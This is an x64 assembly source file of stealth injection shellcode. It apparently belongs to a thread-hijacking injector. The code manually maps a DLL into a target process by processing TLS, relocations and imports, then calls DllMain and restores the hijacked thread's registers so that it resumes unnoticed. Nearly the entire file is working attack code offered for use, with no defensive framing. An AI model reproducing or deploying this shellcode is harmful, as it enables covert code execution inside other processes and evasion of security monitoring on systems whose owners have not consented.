;******************************************************************************
;   Stealth Injection Shellcode for Thread Hijacking
;   
;   Assembled with: ml64.exe /c /Fo stealth_shellcode.obj stealth_shellcode.asm
;   
;   This shellcode is designed to run in a hijacked thread context.
;   It saves XMM registers, performs manual mapping, calls DllMain,
;   signals completion, restores all registers, returns to original execution.
;******************************************************************************

.CODE

;------------------------------------------------------------------------------
; HIJACK_CONTEXT structure offsets - MUST match stealth_shellcode.hpp!
;------------------------------------------------------------------------------
CTX_Lock                EQU 000h
CTX_Completed           EQU 004h
CTX_Result              EQU 008h
CTX_ErrorCode           EQU 00Ch

CTX_OriginalRip         EQU 010h
CTX_OriginalRsp         EQU 018h
CTX_OriginalRax         EQU 020h
CTX_OriginalRbx         EQU 028h
CTX_OriginalRcx         EQU 030h
CTX_OriginalRdx         EQU 038h
CTX_OriginalRsi         EQU 040h
CTX_OriginalRdi         EQU 048h
CTX_OriginalRbp         EQU 050h
CTX_OriginalR8          EQU 058h
CTX_OriginalR9          EQU 060h
CTX_OriginalR10         EQU 068h
CTX_OriginalR11         EQU 070h
CTX_OriginalR12         EQU 078h
CTX_OriginalR13         EQU 080h
CTX_OriginalR14         EQU 088h
CTX_OriginalR15         EQU 090h
CTX_OriginalRflags      EQU 098h

; XMM registers (volatile in x64 ABI)
CTX_OriginalXmm0        EQU 0A0h
CTX_OriginalXmm1        EQU 0B0h
CTX_OriginalXmm2        EQU 0C0h
CTX_OriginalXmm3        EQU 0D0h
CTX_OriginalXmm4        EQU 0E0h
CTX_OriginalXmm5        EQU 0F0h

; PE Image info
CTX_ImageBase           EQU 100h
CTX_ImageSize           EQU 108h
CTX_EntryPointRva       EQU 110h
CTX_RelocDirRva         EQU 118h
CTX_RelocDirSize        EQU 120h
CTX_ImportDirRva        EQU 128h
CTX_ImportDirSize       EQU 130h
CTX_OriginalImageBase   EQU 138h
CTX_TlsDirRva           EQU 140h
CTX_TlsDirSize          EQU 148h

; Function pointers
CTX_pLoadLibraryA       EQU 150h
CTX_pGetProcAddress     EQU 158h
CTX_pNtFlushInstructionCache EQU 160h
CTX_pLdrpHandleTlsData  EQU 168h
CTX_pRtlAddVectoredExceptionHandler EQU 170h

;------------------------------------------------------------------------------
; HijackShellcodeV2
; 
; Input:  RCX = pointer to HIJACK_CONTEXT
; Output: Returns to OriginalRip after DllMain completes
;
; This is the ONLY shellcode function - properly handles register save/restore
;------------------------------------------------------------------------------
HijackShellcodeV2 PROC

    ; RCX = HIJACK_CONTEXT pointer
    
    ; === Save XMM registers immediately (they're volatile) ===
    movaps  xmmword ptr [rcx + CTX_OriginalXmm0], xmm0
    movaps  xmmword ptr [rcx + CTX_OriginalXmm1], xmm1
    movaps  xmmword ptr [rcx + CTX_OriginalXmm2], xmm2
    movaps  xmmword ptr [rcx + CTX_OriginalXmm3], xmm3
    movaps  xmmword ptr [rcx + CTX_OriginalXmm4], xmm4
    movaps  xmmword ptr [rcx + CTX_OriginalXmm5], xmm5
    
    ; === Setup stack frame ===
    push    rbp
    mov     rbp, rsp
    and     rsp, -16                    ; Align stack to 16 bytes
    sub     rsp, 200h                   ; Space for locals + shadow
    
    ; === Save context pointer in non-volatile register ===
    mov     rbx, rcx                    ; RBX = context (preserved across calls)
    
    ; === Process TLS if available ===
    mov     rax, [rbx + CTX_pLdrpHandleTlsData]
    test    rax, rax
    jz      skip_tls
    cmp     qword ptr [rbx + CTX_TlsDirSize], 0
    jz      skip_tls
    mov     rcx, [rbx + CTX_ImageBase]
    call    rax
skip_tls:

    ; === Process Relocations ===
    mov     rax, [rbx + CTX_ImageBase]
    sub     rax, [rbx + CTX_OriginalImageBase]
    mov     rsi, rax                    ; RSI = delta
    test    rsi, rsi
    jz      skip_reloc
    cmp     qword ptr [rbx + CTX_RelocDirSize], 0
    jz      skip_reloc
    
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_RelocDirRva]
    mov     r13, r12
    add     r13, [rbx + CTX_RelocDirSize]

reloc_block_loop:
    cmp     r12, r13
    jae     skip_reloc
    mov     r14d, dword ptr [r12]       ; VirtualAddress
    mov     r15d, dword ptr [r12 + 4]   ; SizeOfBlock
    cmp     r15d, 8
    jbe     next_block
    lea     ecx, [r15 - 8]
    shr     ecx, 1
    lea     rdx, [r12 + 8]

entry_loop:
    test    ecx, ecx
    jz      next_block
    movzx   eax, word ptr [rdx]
    mov     edi, eax
    shr     edi, 12
    cmp     edi, 0Ah                    ; IMAGE_REL_BASED_DIR64
    jne     skip_entry
    and     eax, 0FFFh
    movsxd  rax, eax
    add     rax, r14
    add     rax, [rbx + CTX_ImageBase]
    add     qword ptr [rax], rsi
skip_entry:
    add     rdx, 2
    dec     ecx
    jmp     entry_loop
next_block:
    add     r12, r15
    jmp     reloc_block_loop
skip_reloc:

    ; === Process Imports ===
    cmp     qword ptr [rbx + CTX_ImportDirSize], 0
    jz      skip_imports
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_ImportDirRva]

import_loop:
    mov     eax, dword ptr [r12 + 0Ch]  ; Name RVA
    test    eax, eax
    jz      skip_imports
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     rcx, rax                    ; arg1 = dll name
    call    qword ptr [rbx + CTX_pLoadLibraryA]
    test    rax, rax
    jz      fail
    mov     r14, rax                    ; R14 = module handle
    
    mov     eax, dword ptr [r12]        ; OriginalFirstThunk
    test    eax, eax
    jnz     use_oft
    mov     eax, dword ptr [r12 + 10h]  ; Use FirstThunk if OFT is 0
use_oft:
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     r15, rax                    ; R15 = lookup thunk
    mov     eax, dword ptr [r12 + 10h]  ; FirstThunk (IAT)
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     rdi, rax                    ; RDI = IAT entry

thunk_loop:
    mov     rax, qword ptr [r15]
    test    rax, rax
    jz      next_descriptor
    bt      rax, 63
    jnc     by_name
    movzx   edx, ax                     ; ordinal
    jmp     do_getproc
by_name:
    add     rax, [rbx + CTX_ImageBase]
    add     rax, 2                      ; skip Hint
    mov     rdx, rax                    ; function name
do_getproc:
    mov     rcx, r14                    ; module handle
    call    qword ptr [rbx + CTX_pGetProcAddress]
    test    rax, rax
    jz      fail
    mov     qword ptr [rdi], rax
    add     r15, 8
    add     rdi, 8
    jmp     thunk_loop
next_descriptor:
    add     r12, 14h                    ; sizeof(IMAGE_IMPORT_DESCRIPTOR)
    jmp     import_loop
skip_imports:

    ; === Flush instruction cache ===
    mov     rax, [rbx + CTX_pNtFlushInstructionCache]
    test    rax, rax
    jz      skip_flush
    mov     rcx, -1                     ; NtCurrentProcess()
    mov     rdx, [rbx + CTX_ImageBase]
    mov     r8, [rbx + CTX_ImageSize]
    call    rax
skip_flush:

    ; === Call DllMain ===
    mov     rcx, [rbx + CTX_ImageBase]  ; hinstDLL
    mov     edx, 1                      ; DLL_PROCESS_ATTACH
    xor     r8, r8                      ; lpvReserved = NULL
    mov     rax, [rbx + CTX_ImageBase]
    add     rax, [rbx + CTX_EntryPointRva]
    call    rax
    mov     dword ptr [rbx + CTX_Result], eax
    jmp     done

fail:
    mov     dword ptr [rbx + CTX_Result], 0
    mov     dword ptr [rbx + CTX_ErrorCode], 1

done:
    ; === Signal completion ===
    mov     dword ptr [rbx + CTX_Completed], 1
    
    ; === Restore XMM registers ===
    movaps  xmm0, xmmword ptr [rbx + CTX_OriginalXmm0]
    movaps  xmm1, xmmword ptr [rbx + CTX_OriginalXmm1]
    movaps  xmm2, xmmword ptr [rbx + CTX_OriginalXmm2]
    movaps  xmm3, xmmword ptr [rbx + CTX_OriginalXmm3]
    movaps  xmm4, xmmword ptr [rbx + CTX_OriginalXmm4]
    movaps  xmm5, xmmword ptr [rbx + CTX_OriginalXmm5]
    
    ; === Restore GPRs from context ===
    mov     rax, [rbx + CTX_OriginalRax]
    mov     rcx, [rbx + CTX_OriginalRcx]
    mov     rdx, [rbx + CTX_OriginalRdx]
    mov     rsi, [rbx + CTX_OriginalRsi]
    mov     rdi, [rbx + CTX_OriginalRdi]
    mov     r8,  [rbx + CTX_OriginalR8]
    mov     r9,  [rbx + CTX_OriginalR9]
    mov     r10, [rbx + CTX_OriginalR10]
    mov     r11, [rbx + CTX_OriginalR11]
    mov     r12, [rbx + CTX_OriginalR12]
    mov     r13, [rbx + CTX_OriginalR13]
    mov     r14, [rbx + CTX_OriginalR14]
    mov     r15, [rbx + CTX_OriginalR15]
    
    ; === Setup return to original RIP ===
    mov     rsp, [rbx + CTX_OriginalRsp]
    push    qword ptr [rbx + CTX_OriginalRip]
    mov     rbp, [rbx + CTX_OriginalRbp]
    mov     rbx, [rbx + CTX_OriginalRbx] ; Restore RBX last!
    
    ret     ; Returns to OriginalRip

HijackShellcodeV2 ENDP

;------------------------------------------------------------------------------
; End marker label for size calculation (no code emitted)
;------------------------------------------------------------------------------
HijackShellcodeV2End:

END
